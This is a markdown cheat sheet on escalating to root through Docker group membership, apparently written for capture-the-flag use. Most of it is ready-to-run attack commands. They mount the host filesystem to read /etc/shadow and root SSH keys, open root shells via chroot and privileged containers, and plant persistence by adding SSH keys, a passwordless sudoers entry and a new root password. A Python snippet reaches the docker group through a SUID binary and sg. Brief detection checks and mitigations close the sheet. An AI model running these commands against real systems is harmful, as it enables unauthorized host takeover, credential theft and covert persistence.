# Docker Privilege Escalation

## Quick Reference

If you're in the `docker` group, you effectively have root.

```bash
# Read any file
docker run --rm -v /:/host alpine cat /host/etc/shadow

# Root shell
docker run --rm -v /:/host -it alpine chroot /host /bin/sh

# Full root with all capabilities
docker run --rm --privileged -v /:/host -it alpine chroot /host /bin/bash
```

## Techniques

### 1. Host Filesystem Mount

```bash
# List root directory
docker run --rm -v /:/host alpine ls -la /host/root/

# Read specific files
docker run --rm -v /:/host alpine cat /host/root/.ssh/authorized_keys
docker run --rm -v /:/host alpine cat /host/etc/shadow

# Find flags
docker run --rm -v /:/host alpine find /host -name "*flag*" -type f 2>/dev/null
```

### 2. Root Shell via chroot

```bash
docker run --rm -v /:/host alpine chroot /host /bin/sh -c "id; whoami"
```

### 3. Persistent Access

```bash
# Add SSH key to root
echo "ssh-ed25519 ..." | docker run --rm -v /:/host alpine sh -c 'mkdir -p /host/root/.ssh && cat >> /host/root/.ssh/authorized_keys'

# Add user to sudoers
docker run --rm -v /:/host alpine sh -c 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers'

# Set root password
docker run --rm -v /:/host alpine chroot /host passwd root
```

### 4. Privileged Container

```bash
# Full host access with all capabilities
docker run --rm --privileged -v /:/host alpine chroot /host /bin/bash

# Access host devices
docker run --rm --privileged alpine ls -la /dev/sda

# Mount host filesystem
docker run --rm --privileged -v /dev/sda1:/mnt alpine ls /mnt
```

## Via SUID + sg (No Direct Docker Access)

When you have a SUID binary but no direct docker group in your session:

```python
# See references/suid-sg-docker-escalation.md for the full pattern
# Quick version:
import pty, os, select, ctypes
libc = ctypes.CDLL('libc.so.6')
libc.setresuid(1000, 1000, 1000)
master, slave = pty.openpty()
pid = os.fork()
if pid == 0:
    os.close(master); os.setsid()
    sf = os.open(os.ttyname(slave), os.O_RDWR)
    os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
    os.close(slave)
    os.execve('/usr/bin/sg', ['sg', 'docker', '-c', 'docker run --rm -v /:/host alpine cat /host/root/flag.txt'], os.environ)
os.close(slave)
# Read output from master...
```

## Detection

```bash
# Check if you're in docker group
id | grep docker
getent group docker

# Check docker socket
ls -la /var/run/docker.sock

# Check if you can access docker
docker ps 2>&1
```

## Mitigations (For Defenders)

- Never add users to the docker group
- Use rootless Docker
- Use Docker socket proxies (like Technosophos/docker-socket-proxy)
- Implement AppArmor/SELinux profiles for Docker
- Use `--user` flag to run containers as non-root
